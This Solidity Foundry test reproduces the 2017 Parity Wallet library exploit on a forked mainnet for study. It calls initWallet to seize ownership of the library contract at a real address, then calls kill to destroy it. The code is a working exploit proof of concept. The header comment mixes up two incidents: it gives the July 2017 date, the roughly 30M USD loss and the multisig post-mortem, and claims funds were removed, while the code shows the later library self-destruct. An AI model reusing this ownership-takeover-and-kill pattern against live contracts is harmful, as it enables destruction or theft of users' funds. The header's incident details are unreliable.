// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

/**
 * Key Information
 *  Project Name: Parity Wallet
 *  Date: 2017-07-19
 *  Total Lost : ~30M USD$
 *  Vulenerability: Broken Access Control
 *  Description: The Parity Wallet library was deployed with a bug that allowed anyone to become the owner of the wallet contract. The attacker exploited this bug and became the owner of the wallet contract. The attacker then killed the wallet contract and removed all the funds from the wallet.
 *  Attack Tx1 : https://app.blocksec.com/explorer/tx/eth/0x9dbf0326a03a2a3719c27be4fa69aacc9857fd231a8d9dcaede4bb083def75ec
 *  Attack Tx2 : https://app.blocksec.com/explorer/tx/eth/0xeef10fc5170f669b86c4cd0444882a96087221325f8bf2f55d6188633aa7be7c
 *  Post-mortem : https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7
 */
import "forge-std/Test.sol";

interface parity {

    function isOwner(address _addr) external view returns (bool);

    function kill(address _to) external;

    function initWallet(address[] memory _owners, uint256 _required, uint256 _daylimit) external;

}

contract ContractTest is Test {

    parity WalletLibrary = parity(payable(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4));

    address[] public owner;

    function setUp() public {
        vm.createSelectFork("mainnet", 4_501_735); //fork mainnet at block 4501735
    }

    function testExploit() public {
        WalletLibrary.isOwner(address(this)); // not a owner of contract
        owner.push(address(this));
        WalletLibrary.initWallet(owner, 0, 0);
        bool isowner = WalletLibrary.isOwner(address(this)); // you are owner of contract now
        assertTrue(isowner);
        WalletLibrary.kill(address(this));
        WalletLibrary.isOwner(address(this)); // contract destroyed, return 0
    }

    receive() external payable {}

}
